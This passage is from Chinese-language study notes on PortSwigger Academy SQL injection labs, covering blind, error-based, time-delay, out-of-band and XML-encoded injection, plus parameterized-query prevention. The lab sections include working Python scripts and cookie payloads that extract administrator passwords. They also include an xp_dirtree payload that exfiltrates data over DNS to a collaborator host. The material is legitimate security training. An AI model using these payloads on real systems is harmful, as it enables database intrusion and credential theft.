        'Sec-Ch-Ua': '"Not.A/Brand";v="99", "Chromium";v="136"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"macOS"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://0ad80007034af3b4815416d000260088.web-security-academy.net/filter?category=Pets',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=0, i',
        # 'Cookie': "TrackingId=l0AntyMBnvwpU3eL' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'i; session=JEiebpgsXn8HM4UbG1NvnyExDRGmxQ2U",
    }

    params = {
        'category': 'Pets',
    }

    payload_list = ''

    for i in range(ord('a'), ord('z') + 1):
        payload_list += chr(i)

    for i in range(ord('A'), ord('Z') + 1):
        payload_list += chr(i)

    for i in range(ord('0'), ord('9') + 1):
        payload_list += chr(i)

    ans = ''

    for i in range(1, 20 + 1):
        for j in payload_list:
            cookies['TrackingId'] = f"l0AntyMBnvwpU3eL' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{j}"
            
            response = requests.get(
                'https://0ad80007034af3b4815416d000260088.web-security-academy.net/filter',
                params=params,
                cookies=cookies,
                headers=headers,
                verify=False,
            )

            print(f"\rIndex = {i}, Payload = {j}   ", end='')

            if "Welcome back!" in response.text:
                ans += j
                print()
                print(ans)
                break

    print(f"Password: {ans}")
    ```
7. 取得密碼後登入通關
:::

#### 基於錯誤的 SQL 注入

基於錯誤的 SQL 注入是指您能夠使用錯誤訊息從資料庫中提取或推斷敏感資料的情況，即使在盲注語境中也是如此。可能性取決於資料庫的配置和您能夠觸發的錯誤類型：

* 您可能能夠根據布林表達式的結果誘使應用程式返回特定的錯誤回應。您可以用與我們在前一節中看到的條件回應相同的方式來利用這一點。更多資訊請參閱透過觸發條件錯誤來利用盲注 SQL 注入。
* 您可能能夠觸發輸出查詢語句返回資料的錯誤訊息。這有效地將原本盲注的 SQL 注入漏洞轉變為可見的。更多資訊請參閱透過詳細的 SQL 錯誤訊息提取敏感資料。

##### 透過觸發條件錯誤來利用盲注 SQL 注入

某些應用程式執行 SQL 查詢語句，但無論查詢語句是否返回任何資料，其行為都不會改變。前一節中的技術將無效，因為注入不同的布林條件對應用程式的回應沒有影響。

通常可以根據是否發生 SQL 錯誤來誘使應用程式返回不同的回應。您可以修改查詢語句，使其僅在條件為真時才導致資料庫錯誤。很多時候，資料庫拋出的未處理錯誤會導致應用程式回應中的某些差異，例如錯誤訊息。這使您能夠推斷注入條件的真假。

要了解其工作原理，假設依次發送了包含以下 `TrackingId` cookie 值的兩個請求：

```SQL
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

這些輸入使用 `CASE` 關鍵字來測試條件，並根據表達式是否為真返回不同的表達式：

* 對於第一個輸入，`CASE` 表達式評估為 `'a'`，這不會導致任何錯誤。
* 對於第二個輸入，它評估為 `1/0`，這會導致除零錯誤。

如果錯誤導致應用程式的 HTTP 回應出現差異，您可以使用這個來確定注入的條件是否為真。

使用此技術，您可以透過一次測試一個字元來擷取資料：`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

有不同的方式來觸發條件錯誤，不同的技術在不同的資料庫類型上效果最佳。更多詳細資訊請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

::: tip Lab: [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

1. 這是一個正常的請求，根據題意，Cookie 的 TrackingId 值存在 SQL Injection 漏洞
    ```http
    GET /product?productId=3 HTTP/2
    Host: 0a3800c303fac50a80ac080700870089.web-security-academy.net
    Cookie: TrackingId=LqcMUIEREyrxNatY; session=NW9pXJXJeKgB5JmJ14U4EOhoz6T4aZQ2
    Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "macOS"
    Accept-Language: en-US,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a3800c303fac50a80ac080700870089.web-security-academy.net/
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i

    ```
2. 在後方加入一個引號回應狀態碼 500，驗證 SQLi 可行性
    ```http
    Cookie: TrackingId=LqcMUIEREyrxNatY';
    ```
3. 使用 Error-based 確認密碼 administrator 的密碼長度
    ```http
    Cookie: TrackingId=LqcMUIEREyrxNatY'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';
    ```
4. 當嘗試到 19 的時候，仍然回應狀態碼 500，直到長度大於 20 時，才回應狀態碼 200，由此可知密碼長度為 20。
5. 寫 Exploit 取得 administrator 的密碼：
    ```python=
    import requests
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    cookies = {
        'TrackingId': "LqcMUIEREyrxNatY'||(SELECT CASE WHEN SUBSTR(password,1,1)='' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
        'session': 'NW9pXJXJeKgB5JmJ14U4EOhoz6T4aZQ2',
    }

    headers = {
        'Host': '0a42006e03aa9e8d80150876003e0090.web-security-academy.net',
    }

    params = {
        'productId': '3',
    }

    payload_list = ''

    for i in range(ord('a'), ord('z') + 1):
        payload_list += chr(i)

    for i in range(ord('A'), ord('Z') + 1):
        payload_list += chr(i)

    for i in range(ord('0'), ord('9') + 1):
        payload_list += chr(i)

    ans = ''

    for i in range(1, 20 + 1):
        for j in payload_list:
            cookies['TrackingId'] = f"LqcMUIEREyrxNatY'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{j}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            
            response = requests.get(
                'https://0a42006e03aa9e8d80150876003e0090.web-security-academy.net/product',
                params=params,
                cookies=cookies,
                headers=headers,
                verify=False,
            )

            print(f"\rIndex = {i}, Payload = {j}   ", end='')

            if response.status_code == 500:
                ans += j
                print()
                print(ans)
                break

    print(f"Password: {ans}")
    ```
6. 取得 administrator 密碼：t7azel0rda4zj943749q 並登入完成此 Lab
:::

##### 透過詳細的 SQL 錯誤訊息提取敏感資料

資料庫的錯誤配置有時會導致詳細的錯誤訊息。這些訊息可能為攻擊者提供有用的資訊。例如，考慮以下錯誤訊息，該訊息在將單引號注入 `id` 參數後出現：

```raw
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

這顯示了應用程式使用我們輸入所建構的完整查詢語句。我們可以看到在此情況下，我們正在向 `WHERE` 語句中的單引號字串進行注入。這使得構造包含惡意載荷的有效查詢變得更加容易。註解掉查詢的其餘部分可以防止多餘的單引號破壞語法。

有時候，您可能能夠誘導應用程式產生包含查詢回傳部分資料的錯誤訊息。這有效地將原本的盲注 SQL 注入漏洞轉變為可見的漏洞。

您可以使用 `CAST()` 函數來實現這一點。它能讓您將一種資料類型轉換為另一種。例如，想像一個包含以下語句的查詢：

```sql
CAST((SELECT example_column FROM example_table) AS int)`
```

通常，您試圖讀取的資料是字串。嘗試將其轉換為不相容的資料類型（如 `int`）可能會導致類似以下的錯誤：

```raw
ERROR: invalid input syntax for type integer: "Example data"
```

如果字元限制阻止您觸發條件回應，這種類型的查詢也可能很有用。

::: tip Lab: [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

1. 這是一個正常的請求，根據題意，Cookie 的 TrackingId 值存在 SQL Injection 漏洞
    ```http
    GET /filter?category=Lifestyle HTTP/2
    Host: 0aeb003104258035800962ea00e40016.web-security-academy.net
    Cookie: TrackingId=kSB5ROxwLmJAfNBr; session=KRrIXPibQL2ZYvaF8HZNwPudtJ3l8Jqi
    Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "macOS"
    Accept-Language: en-US,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0aeb003104258035800962ea00e40016.web-security-academy.net/filter?category=Accessories
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i

    ```
2. 將 TrackingId 改成以下 Payload 即可透過錯誤訊息取得第一個使用者的密碼（通常是管理者帳號）
    ```http
    Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --;
    ```
3. 在回應的錯誤訊息中取得密碼：`0jbcieuccfdu9ozttjyk`
4. 嘗試登入 `administrator`/`0jbcieuccfdu9ozttjyk` 完成此 Lab。
:::

#### 透過觸發時間延遲來利用盲注 SQL 注入

如果應用程式在執行 SQL 查詢時捕獲資料庫錯誤並優雅地處理這些錯誤，應用程式的回應就不會有任何差異。這意味著先前用於誘導條件錯誤的技術將無法運作。

在這種情況下，通常可以透過根據注入條件是真或假來觸發時間延遲，從而利用盲注 SQL 注入漏洞。由於 SQL 查詢通常由應用程式同步處理，延遲 SQL 查詢的執行也會延遲 HTTP 回應。這讓您可以根據接收 HTTP 回應所需的時間來判斷注入條件的真偽。

觸發時間延遲的技術特定於所使用的資料庫類型。例如，在 Microsoft SQL Server 上，您可以使用以下方式來測試條件並根據表達式是否為真來觸發延遲：

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* 第一個輸入不會觸發延遲，因為條件 `1=2` 為假。
* 第二個輸入會觸發 10 秒的延遲，因為條件 `1=1` 為真。

使用這種技術，我們可以透過一次測試一個字元來檢索資料：

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

::: info Note

在 SQL 查詢中有各種觸發時間延遲的方法，不同的技術適用於不同類型的資料庫。更多詳細資訊，請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。
:::

::: tip Lab: [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

1. 題目要求讓 SQL 等待 10 秒，並且在 Cookie 的 `TrackingId` 值存在 SQLi 漏洞。
2. 將 Cookie 改成以下 Payload 完成此 Lab
    ```http
    Cookie: TrackingId=LlFw3Xi6O2cEsigP'||pg_sleep(10)--;
    ```
:::

::: tip Lab: [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

1. 依據題目說明，Cookie 的 `TrackingId` 存在 SQLi
2. 測試可透過時間等待判斷條件式
    ```http
    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;

    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;
    ```
3. 判斷密碼長度共 20 個字元
    ```http
    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;

    ...

    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;

    Cookie: TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
    ```
4. 寫程式取得 administrator 的密碼並繳交完成此 Lab：
    ```python
    import requests as re
    from time import time

    chars = []

    for i in range(97,122+1):
        chars.append(chr(i))

    for i in range(0,10):
        chars.append(str(i))

    headers = {
        'Host': '0a35000c04985190808b627b00d90035.web-security-academy.net',
        'Cookie': "TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;"
        }

    ans = ''

    for i in range(1, 20+1):
        for j in chars:
            headers['Cookie'] = f"TrackingId=5sdFcXvFUqhv4j2D'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{j}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;"

            start_time = time()
            receive = re.get('https://0a35000c04985190808b627b00d90035.web-security-academy.net/', headers=headers)
            end_time = time()
            print(f"\rIndex: {i}, Payload: {j}, Time: {end_time - start_time}, Status: {receive.status_code}", end='')
            if (end_time - start_time > 4):
                ans += j
                print()
                print(ans)
                break
    ```
:::

#### 使用帶外 (OAST) 技術利用盲注 SQL 注入

應用程式可能會執行與前面範例相同的 SQL 查詢，但會以非同步方式進行。應用程式在原始執行緒中繼續處理使用者的請求，並使用另一個執行緒來執行使用追蹤 cookie 的 SQL 查詢。該查詢仍然容易受到 SQL 注入攻擊，但到目前為止所描述的技術都不會有效。應用程式的回應不依賴於查詢回傳任何資料、資料庫錯誤的發生，或執行查詢所需的時間。

在這種情況下，通常可以透過觸發對您控制的系統的帶外網路互動來利用盲注 SQL 注入漏洞。這些互動可以基於注入的條件被觸發，以逐一推斷資訊。更有用的是，資料可以直接在網路互動中被外洩。

多種網路協定可用於此目的，但通常最有效的是 DNS（域名服務）。許多生產網路允許 DNS 查詢的自由出站，因為它們對生產系統的正常運作至關重要。

使用帶外技術最簡單且最可靠的工具是 Burp Collaborator。這是一個提供各種網路服務（包括 DNS）自訂實作的伺服器。它允許您檢測當向易受攻擊的應用程式發送個別載荷時是否發生網路互動。Burp Suite Professional 包含一個內建客戶端，配置為可以直接與 Burp Collaborator 配合使用。更多資訊請參閱 Burp Collaborator 的文件。

觸發 DNS 查詢的技術特定於所使用的資料庫類型。例如，在 Microsoft SQL Server 上可以使用以下輸入來對指定域名執行 DNS 查找：

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

這會導致資料庫對以下域名執行查找：

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

您可以使用 Burp Collaborator 產生唯一的子域名，並輪詢 Collaborator 伺服器以確認何時發生任何 DNS 查找。

::: tip Lab: [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

out-of-band 的題目都需要 Burp Suite Professional，來個好心人贊助。
:::

在確認觸發帶外互動的方法後，您就可以使用帶外通道從易受攻擊的應用程式中外洩資料。例如：

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

此輸入會讀取 `Administrator` 使用者的密碼，附加一個唯一的 Collaborator 子域名，並觸發 DNS 查找。此查找讓您可以查看捕獲的密碼：

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

帶外 (OAST) 技術是檢測和利用盲注 SQL 注入的強大方法，因為其成功率很高，且能夠直接在帶外通道中外洩資料。因此，即使在其他盲注利用技術確實有效的情況下，OAST 技術通常也是首選。

::: info Note

有各種觸發帶外互動的方法，不同的技術適用於不同類型的資料庫。更多詳細資訊，請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。
:::

::: tip Lab: [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

out-of-band again，歡迎贊助～
:::

### 如何防止盲注 SQL 注入攻擊？

儘管尋找和利用盲注 SQL 注入漏洞所需的技術與一般 SQL 注入不同且更加複雜，但防止 SQL 注入所需的措施是相同的。

與一般 SQL 注入一樣，盲注 SQL 注入攻擊可以透過謹慎使用參數化查詢來防止，這確保使用者輸入無法干擾預期 SQL 查詢的結構。

::: info Read more

* [How to prevent SQL injection](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection)
* [Find blind SQL injection vulnerabilities using Burp Suite's web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)
:::

## 二階 SQL 注入

一階 SQL 注入發生在應用程式處理來自 HTTP 請求的使用者輸入，並以不安全的方式將輸入併入 SQL 查詢語句中。

二階 SQL 注入發生在應用程式從 HTTP 請求中取得使用者輸入並儲存以供日後使用時。這通常是透過將輸入放入資料庫來完成，但在儲存資料的時候並不會發生漏洞。稍後，當處理不同的 HTTP 請求時，應用程式會擷取儲存的資料，並以不安全的方式將其併入 SQL 查詢語句中。因此，二階 SQL 注入也稱為儲存型 SQL 注入。

![alt](./src/image6.png)

二階 SQL 注入通常發生在開發者了解 SQL 注入漏洞的情況下，因此會安全地處理輸入初次放入資料庫的過程。當資料稍後被處理時，由於之前已安全地放入資料庫，因此被認為是安全的。此時，資料會以不安全的方式處理，因為開發者錯誤地認為它是可信任的。

## 不同語境中的 SQL 注入

在先前的實驗中，您使用查詢字串來注入惡意的 SQL 有效載荷。然而，您可以使用任何可控制的輸入來執行 SQL 注入攻擊，只要該輸入被應用程式作為 SQL 查詢語句處理。例如，某些網站接受 JSON 或 XML 格式的輸入，並使用它來查詢資料庫。

這些不同的格式可能為您提供不同的方式來混淆攻擊，以繞過因 WAF 和其他防禦機制而被封鎖的攻擊。弱實作通常會在請求中尋找常見的 SQL 注入關鍵字，因此您可能能夠透過對禁用關鍵字中的字元進行編碼或跳脫來繞過這些過濾器。例如，以下基於 XML 的 SQL 注入使用 XML 跳脫序列來編碼 `SELECT` 中的 `S` 字元：

```XML
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

這將在傳遞給 SQL 解釋器之前在伺服器端被解碼。

::: tip Lab: [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

1. 這是一個查詢庫存請求的 body：
    ```xml 
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
    ```
2. 嘗試在 storeId 注入 SQL，並發現被 WAF 擋住了
    ```xml
    <storeId>1 UNION SELECT NULL</storeId>
    ```
3. 透過 Hackvertor 套件編碼成功繞過（Extensions > Hackvertor > Encode > dec_entities/hex_entities）
    ```xml
    <storeId><@dec_entities>1 UNION SELECT NULL</@dec_entities></storeId>
    ```
4. 取得帳號密碼並提交完成此 Lab
    ```xml
    <storeId><@dec_entities>1 UNION SELECT username || '~' || password FROM users</@dec_entities></storeId>
    ```
:::

## 如何防範 SQL 注入

您可以透過使用參數化查詢語句而非在查詢語句中使用字串串接來防範大多數的 SQL 注入實例。這些參數化查詢語句也稱為「預備語句」。

以下程式碼容易受到 SQL 注入攻擊，因為使用者輸入直接串接到查詢語句中：

```SQL
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

您可以重新編寫此程式碼，以防止使用者輸入干擾查詢語句結構：

```SQL
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

您可以在不可信輸入作為查詢語句中的資料出現的任何情況下使用參數化查詢語句，包括 `WHERE` 子句以及 `INSERT` 或 `UPDATE` 語句中的值。它們無法用於處理查詢語句其他部分的不可信輸入，例如資料表或欄位名稱，或 `ORDER BY` 子句。將不可信資料放入查詢語句這些部分的應用程式功能需要採用不同的方法，例如：

* 將允許的輸入值列入白名單。
* 使用不同的邏輯來實現所需的行為。

要使參數化查詢語句有效防範 SQL 注入，查詢語句中使用的字串必須始終是硬編碼的常數。它絕不能包含來自任何來源的變數資料。不要試圖逐案判斷某項資料是否可信，並在被認為安全的情況下繼續在查詢語句中使用字串串接。很容易對資料的可能來源產生誤判，或者其他程式碼的變更可能會污染可信資料。

::: info Read more

* [Find SQL injection vulnerabilities using Burp Suite's web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)
:::